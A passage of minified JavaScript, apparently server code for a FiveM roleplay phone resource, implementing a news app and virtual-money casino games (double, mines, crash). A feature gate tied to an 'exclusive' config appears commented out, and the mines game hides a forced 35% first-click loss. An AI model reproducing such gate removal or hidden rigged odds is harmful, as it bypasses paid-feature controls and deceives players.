  f.description.length > 120 && (f.description = f.description.substring(0, 120) + '...'), oS(-1, 'WEAZEL', f);
};
const rI = {};
rF.weazel_view = async (d, e) => {
  const f = await vRP.getUserId(d);
  const g = await rE().find(e);

  if (!g) {
    return null;
  }

  const h = e + '-' + f;

  if (!rI[h]) {
    rI[h] = true;
    const k = {};
    k.id = e, await rE().update().where(k).increment('views', 1);
  }

  return g;
}, rF.weazel_destroy = async (c, d) => {
  const e = await vRP.getUserId(c),
    f = await pE(e,);

  if (f) {
    const g = await rE().find(d);

    if (g) {
      await rE().destroy(d), oS(-1, 'WEAZEL_DESTROY', d), qf({
        'name': 'Weazel - Notícia excluída',
        'avatar': 'weazel',
        'content': {
          'PASSAPORTE': e,
          'NOTICIA': g.title,
          'CATEGORIA': g.tag,
          'DESCRICAO': g.description.substring(0, 256),
          'IMAGEM': g.imageURL,
          'VIDEO': g.videoURL
        }
      });
    }
  }
}, rF.weazel_update = async (e, f, g) => {
  const h = await vRP.getUserId(e),
    i = await rH(h, g),
    j = await rE().find(f);

  if (!j) {
    const l = {
      'error': 'Notícia não encontrada'
    };
    return l;
  }

  console.log(i);
  const k = {};
  k.id = f, await rE().where(k).update(i), qf({
    'name': 'Weazel - Notícia atualizada',
    'avatar': 'weazel',
    'content': {
      'PASSAPORTE': h,
      'NOTICIA': j.title + ' -> ' + i.title,
      'CATEGORIA': j.tag + ' -> ' + i.tag,
      'DESCRICAO': j.description.substring(0, 256) + ' -> ' + i.description.substring(0, 256),
      'IMAGEM': (j.imageURL + ' -> ' + i.imageURL).replace(/null|undefined/g, 'N/A'),
      'VIDEO': (j.videoURL + ' -> ' + i.videoURL).replace(/null|undefined/g, 'N/A')
    }
  });
}, rF.weazel_check = async c => {
  const d = await vRP.getUserId(c);
  return pE(d, pB.exclusive.weazel.permission);
}, rF.weazel_tags = () => pB.exclusive.weazel.tags;
const rJ = {
  '__proto__': null
};
var rK = Object.freeze(rJ);

const rL = () => pc('smartphone_casino');

let rM = p4(pB, 'exclusive', 'casino', 'maxBet') || Infinity;

function rN(c) {
  if (pB.exclusive?.['casino']?.['custom']) {
    return vRP.getCasinoMoney(c);
  }

  return vRP.getBankMoney(c);
}

function rO(c, d) {
  if (pB.exclusive?.['casino']?.['custom']) {
    return vRP.setCasinoMoney(c, d);
  }

  return vRP.setBankMoney(c, d);
}

const rP = {};
pF.ready(async c => {
  /*if (!pB.exclusive || !pB.exclusive.casino || !pF['💀']) {
    if (pB.client.disabledApps) {
      //pB.client.disabledApps.push('casino');
    } else {
      //pB.client.disabledApps = ['casino'];
    }

    return;
  }*/

  const d = rL();

  if (!c.includes(d.table)) {
    await d.create(i => {
      i.int('user_id').primary(), i.bigint('balance').default(0), i.bigint('double').default(0), i.bigint('crash').default(0), i.bigint('mine').default(0);
    });
  }

  Object.assign(pL, rP);
});
const rQ = {};

async function rR(e) {
  if (!Number.isSafeInteger(e)) return 0;

  if (e in rQ) {
    return rQ[e];
  }

  const f = {};
  f.user_id = e;
  const g = await rL().where(f).first().select('balance');

  if (!g) {
    const j = {};
    return j.user_id = e, await rL().insert(j), rQ[e] = 0;
  }

  return rQ[e] = g.balance;
}

async function rS(e, f) {
  rQ[e] = f;
  const g = {};
  g.user_id = e;
  const h = {};
  h.balance = f, await rL().where(g).update(h);
}

async function rT(c, d) {
  const e = await rR(c);
  await rS(c, e + d);
}

const rU = new Set();
rP.casino_subscribe = c => rU.add(c), rP.casino_unsubscribe = c => rU.delete(c);

function rV(c, d) {
  rU.forEach(e => oS(e, c, d));
}

rP.casino_balance = async c => {
  const d = await vRP.getUserId(c);
  return rR(d);
}, rP.casino_deposit = async (e, f) => {
  const g = await vRP.getUserId(e);
  if (!Number.isSafeInteger(g) || !parseInt(f) || f <= 0) return;
  const h = await rN(g);

  if (h >= f) {
    const j = {};
    j.PASSAPORTE = g, j.VALOR = f;
    const k = {
      'name': 'Casino - Depósito',
      'avatar': 'casino'
    };
    return k.content = j, qf(k), await rO(g, h - f), await rT(g, f), true;
  }

  return false;
}, rP.casino_withdraw = async (e, f) => {
  const g = await vRP.getUserId(e);
  if (!Number.isSafeInteger(g) || !parseInt(f) || f <= 0) return;
  const h = await rN(g),
    i = await rR(g);

  if (i >= f) {
    const j = {};
    j.PASSAPORTE = g, j.VALOR = f;
    const k = {
      'name': 'Casino - Saque',
      'avatar': 'casino'
    };
    return k.content = j, qf(k), await rO(g, h + f), await rS(g, i - f), true;
  }

  return false;
};
const rW = {
  'white': 0xe,
  'red': 0x2,
  'black': 0x2
};

class rX {
  static ['last'] = Array(10).fill('').map(() => {
    const number = Math.floor(Math.random() * 15);

    if (number == 0) {
      return 'white';
    } else {
      return number > 7 ? 'black' : 'red';
    }
  });
  static ['multipliers'] = rW;

  constructor() {
    this.refresh();
  }

  get ['delay']() {
    return this.rolling ? rY.endAt - Date.now() : rY.startAt - Date.now();
  }

  ['addBet'](e, f, g) {
    if (!this.startAt) {
      this.startAt = Date.now() + 15000, setTimeout(() => this.roll(), 15500);
    }

    const h = {};
    h.user_id = e, h.color = f, h.amount = g;
    this.bets.push(h), this.aggregate[f][0] += 1, this.aggregate[f][1] += g;
    const i = {};
    i.color = f, i.amount = g, rV('CASINO_DOUBLE_BET', i);
  }

  ['getBets'](c) {
    return this.bets.reduce((d, e) => d + (e.user_id == c ? e.amount : 0), 0);
  }

  ['roll']() {
    this.rolling = true, this.endAt = Date.now() + 15000, this.result = Math.floor(Math.random() * 15), rV('CASINO_DOUBLE', this.result);
    setTimeout(() => {
      rV('CASINO_DOUBLE_RESET'), this.refresh();
    }, 15500);
    const c = this.result == 0 ? 'white' : this.result > 7 ? 'black' : 'red';

    if (rX.last.push(c) > 10) {
      rX.last.shift();
    }

    const d = {};

    for (const f of this.bets.pluck('user_id').unique()) {
      let h = 0,
        i = 0;

      for (const k of this.bets) {
        if (k.user_id == f) {
          i -= k.amount;

          if (k.color == c) {
            h += rX.multipliers[c] * k.amount;
          }
        }
      }

      i += h;
      const j = h + ':' + i;

      if (j in d) {
        d[j].push(f);
      } else {
        d[j] = [f];
      }
    }

    Object.entries(d).forEach(async ([q, r]) => {
      const [t, u] = q.split(':');
      await rL().update().whereIn('user_id', r).increment('double', u).increment('balance', t);

      for (const v of r) {
        if (v in rQ) {
          rQ[v] += parseInt(t);
        }
      }
    });
  }

  ['refresh']() {
    this.bets = [];
    const d = {};
    d.red = [0, 0], d.black = [0, 0];
    d.white = [0, 0], this.aggregate = d, this.rolling = false;
    this.startAt = null, this.endAt = null;
  }

}

const rY = new rX();
rP.casino_double = () => {
  const f = rX.last;

  if (rY.rolling) {
    const i = {
      'status': 'rolling'
    };
    return i.last = f, i.result = rY.result, i.delay = rY.delay, i;
  } else {
    if (rY.startAt) {
      const k = {
        'status': 'bet'
      };
      return k.last = f, k.aggregate = rY.aggregate, k.delay = rY.delay, k;
    }
  }

  const g = {
    'status': 'waiting'
  };
  return g.last = f, g;
}, rP.casino_double_bet = async (h, i, j) => {
  const k = await vRP.getUserId(h),
    l = {
      'error': 'Você está bugado'
    };
  if (!Number.isSafeInteger(k)) return l;
  j = parseInt(j);

  if (!j || j <= 0) {
    const o = {
      'error': 'Valor inválido'
    };
    return o;
  } else {
    if (rY.rolling) {
      const q = {
        'error': 'Aguarde a roleta finalizar o jogo atual'
      };
      return q;
    } else {
      if (rY.getBets(k) + j > rM) return {
        'error': 'O limite de apostas é ' + pu(rM)
      };
    }
  }

  const m = await rR(k);

  if (m < j) {
    const s = {
      'error': 'Saldo insuficiente'
    };
    return s;
  } else {
    if (j > rM) {
      const v = {};
      return v.error = 'O limite de apostas é ' + rM, v;
    }
  }

  return rY.addBet(k, i, j), await rS(k, m - j), rY.delay;
};
const rZ = {};
rZ.multipliers = [0, 0.05, 0.06, 0.07, 0.08, 0.1, 0.15, 0.2, 0.25, 0.35, 0.45, 0.55, 0.65, 0.75, 0.9, 1.1, 1.3, 1.6, 2, 2.4, 2.6, 3.5, 5, 8, 20];
const s0 = rZ;

function s1(c) {
  const d = Array(25).fill(1);

  while (c > 0) {
    const e = Math.floor(Math.random() * d.length);

    if (d[e]) {
      d[e] = 0, c -= 1;
    }
  }

  return d;
}

global.on('playerDropped', () => delete s0[source]), rP.casino_mine_start = async (j, k, l) => {
  const m = await vRP.getUserId(j);

  if (!Number.isSafeInteger(m)) {
    const s = {
      'error': 'Você está bugado'
    };
    return s;
  } else {
    if (m in s0) {
      const u = {
        'error': 'Você já está em um jogo'
      };
      return u;
    } else {
      if (!(k = parseInt(k)) || k <= 0) {
        const v = {
          'error': 'Valor da aposta inválido'
        };
        return v;
      } else {
        if (!(l = parseInt(l)) || l < 1 || l > 24) {
          const x = {
            'error': 'Quantidade de minas inválida'
          };
          return x;
        } else {
          if (k > rM) {
            return {
              'error': 'O limite por aposta é ' + pu(rM)
            };
          }
        }
      }
    }
  }

  const n = await rR(m);

  if (n < k) {
    const A = {
      'error': 'Saldo insuficiente'
    };
    return A;
  }

  await rS(m, n - k);
  const o = {
    'id': require('crypto').randomUUID(),
    'revealed': {},
    'lost': false,
    'multiplier': s0.multipliers[l],
    'bet': k,
    'reward': 0x0,
    'grid': s1(l)
  };
  s0[j] = o;
  const p = {};
  p.user_id = m, await rL().where(p).update().decrement('mine', k);
  const q = {
    ...o
  };
  q.grid = undefined;
  return q;
}, rP.casino_mine_finish = async h => {
  const i = await vRP.getUserId(h);

  if (!Number.isSafeInteger(i)) {
    const n = {
      'error': 'Você está bugado'
    };
    return n;
  } else {
    if (!s0.hasOwnProperty(h)) {
      const p = {
        'error': 'Você não está em um jogo'
      };
      return p;
    }
  }

  const j = s0[h];

  if (j.reward == 0) {
    const r = {
      'error': 'Você não pode encerrar o jogo agora'
    };
    return r;
  }

  const k = Math.ceil(j.bet + j.reward);
  await rT(i, k);
  const l = {};
  l.user_id = i, await rL().where(l).update().increment('mine', k), delete s0[h];
  const m = {};
  return m.reward = k, m;
}, rP.casino_mine_click = async (g, h) => {
  const i = await vRP.getUserId(g);

  if (!Number.isSafeInteger(i)) {
    const l = {
      'error': 'Você está bugado'
    };
    return l;
  } else {
    if (!s0.hasOwnProperty(g)) {
      const o = {
        'error': 'Você não está em um jogo'
      };
      return o;
    } else {
      if (!Number.isSafeInteger(h) || h < 0 || h > 24) {
        const q = {
          'error': 'ERR_INVALID_INDEX'
        };
        return q;
      }
    }
  }

  const j = s0[g];

  if (j.revealed[h]) {
    const s = {
      'error': 'Você já revelou esta mina'
    };
    return s;
  }

  const k = Math.random() <= 0.35 && j.reward == 0;

  if (!j.grid[h] || k) {
    return delete s0[g], ['mine', Math.ceil(j.bet + j.reward)];
  }

  return j.revealed[h] = true, j.reward += j.bet * j.multiplier, ['diamond', Math.ceil(j.bet + j.reward)];
};

const s2 = c => require('crypto').createHash('sha256').update(c).digest('hex');

function s3(c, d) {
  let e = 0,
    f = c.length % 4;

  for (let g = f > 0 ? f - 4 : 0; g < c.length; g += 4) {
    e = ((e << 16) + parseInt(c.substring(g, g + 4), 16)) % d;
  }

  return e === 0;
}

function s4() {
  return s2(process.hrtime()[1] + pB.token);
}

function s5(c) {
  if (s3(c, p4(pB, 'exclusive', 'casino', 'instaCrash') || 5)) return 1;
  let d = parseInt(c.slice(0, 13), 16),
    f = Math.pow(2, 52),
    g = Math.floor((100 * f - d) / (f - d)) / 100;

  while (g >= (p4(pB, 'exclusive', 'casino', 'maxCrash') || 50)) {
    g /= 1.125;
  }

  return parseFloat(g.toFixed(2));
}

class s6 {
  static ['last'] = Array(10).fill('').map(() => s5(s4()));

  constructor() {
    this.refresh();
  }

  ['addBet'](d, e, f, g) {
    if (!this.bets.length) {
      this.startAt = Date.now() + 15000, setTimeout(() => {
        this.crash();
      }, 15500), rV('CASINO_CRASH_WARMUP');
    }

    const h = {};
    h.source = d, h.user_id = e, h.amount = f, h.cashout = g;
    this.bets.push(h);
  }

  ['getBets'](c) {
    return this.bets.reduce((d, e) => d + (e.user_id == c ? e.amount : 0), 0);
  }

  get ['delay']() {
    if (this.status === 'ending') {
      return this.endAt - Date.now();
    } else return this.bets.length ? this.startAt - Date.now() : 0;
  }

  ['crash']() {
    const c = s5(s4());
    rV('CASINO_CRASH', c <= 1), this.multiplier = 1, this.status = 'crashing';
    let d = Date.now();
    const e = setInterval(() => {
      if (this.multiplier >= c) {
        return this.status = 'ending', this.endAt = Date.now() + 5000, rV('CASINO_CRASH_ENDING', c), setTimeout(() => this.refresh(), 5000), s6.last.push(c), s6.last.shift(), clearInterval(e);
      }

      const f = Date.now();
      let g = f - d;
      this.multiplier = Math.min(this.multiplier + Math.floor(this.multiplier) * (g / 100 * 0.01), c);
      d = f;

      for (const i of this.bets) {
        if (i.cashout && this.multiplier >= i.cashout) {
          if (!i.locked) {
            i.locked = true;
            const j = Math.ceil(i.amount * i.cashout);
            rT(i.user_id, j);
            const k = {};
            k.user_id = i.user_id, rL().where(k).update().increment('crash', j).then(), oS(i.source, 'CASINO_INCREMENT', j), oS(i.source, 'CASINO_CRASH_CASHOUT', [this.multiplier, j]);
          }
        }
      }
    }, 80);
  }

  ['refresh']() {
    this.status = 'waiting';
    this.bets = [], delete this.startAt;
    delete this.endAt, rV('CASINO_CRASH_REFRESH');
  }

}

const s7 = new s6();
rP.casino_crash = c => ({
  'status': s7.status,
  'multiplier': s7.multiplier,
  'delay': s7.delay,
  'last': s6.last,
  'totalBet': s7.bets.reduce((d, e) => d + (e.source == c ? e.amount : 0), 0)
}), rP.casino_crash_bet = async (j, k, l) => {
  const m = await vRP.getUserId(j),
    n = {
      'error': 'Você está bugado'
    };
  if (!Number.isSafeInteger(m)) return n;
  k = parseInt(k);

  if (!k || k <= 0) {
    const r = {
      'error': 'Valor inválido'
    };
    return r;
  } else {
    if (s7.status === 'crashing') {
      const s = {
        'error': 'Aguarde o jogo atual finalizar'
      };
      return s;
    } else {
      if (s7.getBets(m) + k > rM) return {
        'error': 'O limite de apostas é ' + pu(rM)
      };
    }
  }

  const o = await rR(m);

  if (o < k) {
    const t = {
      'error': 'Saldo insuficiente'
    };
    return t;
  } else {
    if (l && typeof l !== 'number') {
      const u = {
        'error': 'Valor de auto retirada inválido'
      };
      return u;
    }
  }

  s7.addBet(j, m, k, l), await rS(m, o - k);
  const p = {};
  p.user_id = m, await rL().where(p).update().decrement('crash', k);
  const q = {};
  return q.delay = s7.delay, q;
}, rP.casino_crash_cashout = async h => {
  const i = await vRP.getUserId(h),
    j = {
      'error': 'Você está bugado'
    };
  if (!Number.isSafeInteger(i)) return j;
  const k = s7.bets.filter(p => p.user_id == i),
    l = k.filter(p => !p.locked);

  if (!k.length) {
    const p = {
      'error': 'Você não fez nenhuma aposta'
    };
    return p;
  } else {
    if (!l.length) {
      const q = {
        'error': 'Seu prêmio já foi resgatado'
      };
      return q;
    } else {
      if (s7.status !== 'crashing') {
        const r = {
          'error': 'O jogo ainda não começou'
        };
        return r;
      }
    }
  }

  const m = s7.multiplier;
  let n = 0;

  for (const s of l) {
    s.locked = true, n += Math.ceil(s.amount * m);
  }

  await rT(i, n);
  const o = {};
  return o.user_id = i, await rL().where(o).update().increment('crash', n), [m, n];
};
const s8 = {
  '__proto__': null
};
var s9 = Object.freeze(s8);
